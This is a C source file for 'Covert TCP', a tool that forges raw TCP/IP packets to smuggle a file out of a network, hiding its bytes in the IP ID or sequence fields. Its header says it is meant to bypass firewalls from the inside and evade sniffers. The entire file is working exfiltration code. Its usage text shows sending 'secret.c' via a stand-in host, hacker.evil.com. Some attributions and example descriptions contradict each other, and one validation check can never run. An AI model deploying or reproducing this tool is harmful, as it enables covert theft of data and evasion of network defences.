/* Covert_TCP 1.0 - Covert channel file transfer for Linux
 * This program manipulates the TCP/IP header to transfer a file one byte
 * at a time to a destination host. This progam can act as a server and a client
 * and can be used to conceal transmission of data inside the IP header.
 * This is useful for bypassing firewalls from the inside, and for
 * exporting data with innocuous looking packets that contain no data for
 * sniffers to analyze. In other words, spy stuff... :)
 *
 * This software should be used at your own risk.
 * Compile: gcc -o covert_tcp covert_tcp.c
 * Developed and tested at PAEC During Research on Covert Communications
 * Small portions from various packet utilities by unknown authors
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <errno.h>
#include <time.h>

#define VERSION "1.0"
#define MAX_HOST_LEN 256
#define MAX_FILE_LEN 1024
#define DEFAULT_PORT 80

/* Function prototypes */
void forge_packet(uint32_t src_addr, uint32_t dst_addr, uint16_t src_port, uint16_t dst_port,
                  const char *filename, int server, int ipid, int seq, int ack);
uint16_t in_cksum(uint16_t *addr, size_t len);
uint32_t host_to_ip(const char *hostname);
void usage(const char *progname);

/* Pseudo-header for TCP checksum */
struct pseudo_header {
    uint32_t source_address;
    uint32_t dest_address;
    uint8_t placeholder;
    uint8_t protocol;
    uint16_t tcp_length;
    struct tcphdr tcp;
};

int main(int argc, char *argv[]) {
    uint32_t src_host = 0, dst_host = 0;
    uint16_t src_port = 0, dst_port = DEFAULT_PORT;
    int ipid = 0, seq = 0, ack = 0, server = 0;
    char *filename = NULL, *srchost = NULL, *desthost = NULL;
    int i;

    printf("Covert TCP %s (c)1996 Craig H. Rowland (crowland@psionic.com)\n", VERSION);
    printf("Not for commercial use without permission.\n\n");

    if (geteuid() != 0) {
        fprintf(stderr, "\nYou need to be root to run this.\n\n");
        exit(EXIT_FAILURE);
    }

    if (argc < 2) {
        usage(argv[0]);
        exit(EXIT_FAILURE);
    }

    /* Parse command-line arguments */
    for (i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "-dest") && i + 1 < argc) {
            desthost = argv[++i];
            dst_host = host_to_ip(desthost);
        } else if (!strcmp(argv[i], "-source") && i + 1 < argc) {
            srchost = argv[++i];
            src_host = host_to_ip(srchost);
        } else if (!strcmp(argv[i], "-file") && i + 1 < argc) {
            filename = argv[++i];
        } else if (!strcmp(argv[i], "-source_port") && i + 1 < argc) {
            src_port = atoi(argv[++i]);
        } else if (!strcmp(argv[i], "-dest_port") && i + 1 < argc) {
            dst_port = atoi(argv[++i]);
        } else if (!strcmp(argv[i], "-ipid")) {
            ipid = 1;
        } else if (!strcmp(argv[i], "-seq")) {
            seq = 1;
        } else if (!strcmp(argv[i], "-ack")) {
            ack = 1;
        } else if (!strcmp(argv[i], "-server")) {
            server = 1;
        } else {
            fprintf(stderr, "Unknown option: %s\n", argv[i]);
            usage(argv[0]);
            exit(EXIT_FAILURE);
        }
    }

    /* Validate encoding flags */
    if (ipid + seq + ack > 1) {
        fprintf(stderr, "\n\nOnly one encoding/decode flag (-ipid -seq -ack) can be used at a time.\n\n");
        exit(EXIT_FAILURE);
    }
    if (ipid + seq + ack == 0) {
        ipid = 1; /* Default to IP ID encoding */
    }

    /* Validate filename */
    if (!filename) {
        fprintf(stderr, "\n\nYou need to supply a filename (-file <filename>)\n\n");
        exit(EXIT_FAILURE);
    }

    /* Validate modes */
    if (server) {
        if (!src_host && !src_port) {
            fprintf(stderr, "You need to supply a source address and/or source port for server mode.\n");
            exit(EXIT_FAILURE);
        }
        if (ack && !server) {
            fprintf(stderr, "\n\n-ack decoding can only be used in SERVER mode (-server)\n\n");
            exit(EXIT_FAILURE);
        }
        printf("Listening for data from IP: %s\n", srchost ? srchost : "Any Host");
        if (src_port == 0)
            printf("Listening for data bound for local port: Any Port\n");
        else
            printf("Listening for data bound for local port: %u\n", src_port);
        printf("Decoded Filename: %s\n", filename);
        if (ipid)
            printf("Decoding Type Is: IP packet ID\n");
        else if (seq)
            printf("Decoding Type Is: IP Sequence Number\n");
        else if (ack)
            printf("Decoding Type Is: IP ACK field bounced packet.\n");
        printf("\nServer Mode: Listening for data.\n\n");
    } else {
        if (!src_host || !dst_host) {
            fprintf(stderr, "\n\nYou need to supply a source and destination address for client mode.\n\n");
            exit(EXIT_FAILURE);
        }
        printf("Destination Host: %s\n", desthost);
        printf("Source Host     : %s\n", srchost);
        if (src_port == 0)
            printf("Originating Port: random\n");
        else
            printf("Originating Port: %u\n", src_port);
        printf("Destination Port: %u\n", dst_port);
        printf("Encoded Filename: %s\n", filename);
        if (ipid)
            printf("Encoding Type   : IP ID\n");
        else if (seq)
            printf("Encoding Type   : IP Sequence Number\n");
        printf("\nCLIENT MODE: Sending data.\n\n");
    }

    /* Seed random number generator */
    srand(time(NULL) ^ getpid());

    /* Start packet forging */
    forge_packet(src_host, dst_host, src_port, dst_port, filename, server, ipid, seq, ack);

    return 0;
}

void forge_packet(uint32_t src_addr, uint32_t dst_addr, uint16_t src_port, uint16_t dst_port,
                  const char *filename, int server, int ipid, int seq, int ack) {
    struct {
        struct ip ip;
        struct tcphdr tcp;
    } send_tcp;
    struct {
        struct ip ip;
        struct tcphdr tcp;
        char buffer[65535];
    } recv_pkt;
    struct pseudo_header psh;
    struct sockaddr_in sin;
    FILE *file;
    int sock, ch, one = 1;

    /* Client mode: Send file */
    if (!server) {
        file = fopen(filename, "rb");
        if (!file) {
            perror("I cannot open the file for reading");
            exit(EXIT_FAILURE);
        }

        /* Create raw socket */
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (sock < 0) {
            perror("send socket cannot be open. Are you root?");
            exit(EXIT_FAILURE);
        }
        if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
            perror("Error setting IP_HDRINCL");
            close(sock);
            exit(EXIT_FAILURE);
        }

        /* Initialize destination */
        sin.sin_family = AF_INET;
        sin.sin_addr.s_addr = dst_addr;

        while ((ch = fgetc(file)) != EOF) {
            /* Initialize IP header */
            memset(&send_tcp, 0, sizeof(send_tcp));
            send_tcp.ip.ip_v = 4;
            send_tcp.ip.ip_hl = 5;
            send_tcp.ip.ip_tos = 0;
            send_tcp.ip.ip_len = htons(sizeof(struct ip) + sizeof(struct tcphdr));
            send_tcp.ip.ip_id = ipid ? ch : rand() % 65535;
            send_tcp.ip.ip_off = 0;
            send_tcp.ip.ip_ttl = 64;
            send_tcp.ip.ip_p = IPPROTO_TCP;
            send_tcp.ip.ip_src.s_addr = src_addr;
            send_tcp.ip.ip_dst.s_addr = dst_addr;

            /* Initialize TCP header */
            send_tcp.tcp.th_sport = src_port ? htons(src_port) : rand() % 65535 + 1;
            send_tcp.tcp.th_dport = htons(dst_port);
            send_tcp.tcp.th_seq = seq ? ch : rand() % 4294967295;
            send_tcp.tcp.th_ack = 0;
            send_tcp.tcp.th_off = 5;
            send_tcp.tcp.th_flags = TH_SYN;
            send_tcp.tcp.th_win = htons(512);
            sin.sin_port = send_tcp.tcp.th_sport;

            /* Compute checksums */
            send_tcp.ip.ip_sum = in_cksum((uint16_t *)&send_tcp.ip, sizeof(struct ip));
            psh.source_address = src_addr;
            psh.dest_address = dst_addr;
            psh.placeholder = 0;
            psh.protocol = IPPROTO_TCP;
            psh.tcp_length = htons(sizeof(struct tcphdr));
            memcpy(&psh.tcp, &send_tcp.tcp, sizeof(struct tcphdr));
            send_tcp.tcp.th_sum = in_cksum((uint16_t *)&psh, sizeof(psh));

            /* Send packet */
            if (sendto(sock, &send_tcp, sizeof(struct ip) + sizeof(struct tcphdr), 0,
                       (struct sockaddr *)&sin, sizeof(sin)) < 0) {
                perror("Error sending packet");
                close(sock);
                fclose(file);
                exit(EXIT_FAILURE);
            }
            printf("Sending Data: %c\n", ch);
            usleep(10000); /* Small delay to avoid network overload */
        }

        /* Send EOF signal (IP ID = 0) */
        send_tcp.ip.ip_id = 0;
        send_tcp.tcp.th_seq = 0;
        send_tcp.ip.ip_sum = in_cksum((uint16_t *)&send_tcp.ip, sizeof(struct ip));
        memcpy(&psh.tcp, &send_tcp.tcp, sizeof(struct tcphdr));
        send_tcp.tcp.th_sum = in_cksum((uint16_t *)&psh, sizeof(psh));
        sendto(sock, &send_tcp, sizeof(struct ip) + sizeof(struct tcphdr), 0,
               (struct sockaddr *)&sin, sizeof(sin));

        close(sock);
        fclose(file);
    }
    /* Server mode: Receive file */
    else {
        file = fopen(filename, "wb");
        if (!file) {
            perror("I cannot open the file for writing");
            exit(EXIT_FAILURE);
        }

        sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if (sock < 0) {
            perror("receive socket cannot be open. Are you root?");
            exit(EXIT_FAILURE);
        }

        while (1) {
            ssize_t len = read(sock, &recv_pkt, sizeof(recv_pkt));
            if (len < 0) {
                perror("Error reading socket");
                break;
            }
            if (len < sizeof(struct ip) + sizeof(struct tcphdr)) {
                continue; /* Packet too small */
            }

            /* Check if packet matches criteria */
            if ((src_port == 0 || ntohs(recv_pkt.tcp.th_dport) == src_port) &&
                (src_addr == 0 || recv_pkt.ip.ip_src.s_addr == src_addr) &&
                (recv_pkt.tcp.th_flags & TH_SYN)) {
                uint8_t data;
                if (ipid) {
                    data = recv_pkt.ip.ip_id & 0xFF;
                } else if (seq) {
                    data = recv_pkt.tcp.th_seq & 0xFF;
                } else if (ack) {
                    data = recv_pkt.tcp.th_ack & 0xFF;
                }

                /* Check for EOF (IP ID = 0) */
                if (ipid && recv_pkt.ip.ip_id == 0) {
                    printf("Received EOF signal\n");
                    break;
                }

                printf("Receiving Data: %c\n", data);
                fputc(data, file);
                fflush(file);
            }
        }

        close(sock);
        fclose(file);
    }
}

uint16_t in_cksum(uint16_t *addr, size_t len) {
    uint32_t sum = 0;
    while (len > 1) {
        sum += *addr++;
        len -= 2;
    }
    if (len == 1) {
        uint16_t odd = 0;
        *(uint8_t *)(&odd) = *(uint8_t *)addr;
        sum += odd;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return ~sum;
}

uint32_t host_to_ip(const char *hostname) {
    struct addrinfo hints, *res;
    struct sockaddr_in *sin;
    uint32_t addr;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_RAW;

    if (getaddrinfo(hostname, NULL, &hints, &res) != 0) {
        fprintf(stderr, "cannot resolve %s\n", hostname);
        exit(EXIT_FAILURE);
    }

    sin = (struct sockaddr_in *)res->ai_addr;
    addr = sin->sin_addr.s_addr;
    freeaddrinfo(res);
    return addr;
}

void usage(const char *progname) {
    fprintf(stderr,
            "Covert TCP usage: \n%s -dest dest_ip -source source_ip -file filename "
            "-source_port port -dest_port port -server [encode type]\n\n",
            progname);
    fprintf(stderr, "-dest dest_ip      - Host to send data to.\n");
    fprintf(stderr, "-source source_ip  - Host where you want the data to originate from.\n");
    fprintf(stderr, "                     In SERVER mode this is the host data will\n");
    fprintf(stderr, "                     be coming FROM.\n");
    fprintf(stderr, "-source_port port  - IP source port you want data to appear from. \n");
    fprintf(stderr, "                     (randomly set by default)\n");
    fprintf(stderr, "-dest_port port    - IP source port you want data to go to. In\n");
    fprintf(stderr, "                     SERVER mode this is the port data will be coming\n");
    fprintf(stderr, "                     inbound on. Port 80 by default.\n");
    fprintf(stderr, "-file filename     - Name of the file to encode and transfer.\n");
    fprintf(stderr, "-server            - Passive mode to allow receiving of data.\n");
    fprintf(stderr, "[Encode Type] - Optional encoding type\n");
    fprintf(stderr, "-ipid - Encode data a byte at a time in the IP packet ID. [DEFAULT]\n");
    fprintf(stderr, "-seq  - Encode data a byte at a time in the packet sequence number.\n");
    fprintf(stderr, "-ack  - DECODE data a byte at a time from the ACK field.\n");
    fprintf(stderr, "        This ONLY works from server mode and is made to decode\n");
    fprintf(stderr, "        covert channel packets that have been bounced off a remote\n");
    fprintf(stderr, "        server using -seq. See documentation for details\n");
    fprintf(stderr, "\nPress ENTER for examples.");
    getchar();
    fprintf(stderr, "\nExample: \n%s -dest foo.bar.com -source hacker.evil.com -source_port 1234 -dest_port 80 -file secret.c\n\n", progname);
    fprintf(stderr, "Above sends the file secret.c to the host hacker.evil.com a byte \n");
    fprintf(stderr, "at a time using the default IP packet ID encoding.\n");
    fprintf(stderr, "\nExample: \n%s -dest foo.bar.com -source zaheercena.online -dest_port 80 -server -file secret.c\n\n", progname);
    fprintf(stderr, "Above listens passively for packets from zaheercena.online\n");
    fprintf(stderr, "destined for port 80. It takes the data and saves the file locally\n");
    fprintf(stderr, "as secret.c\n\n");
    exit(EXIT_FAILURE);
}
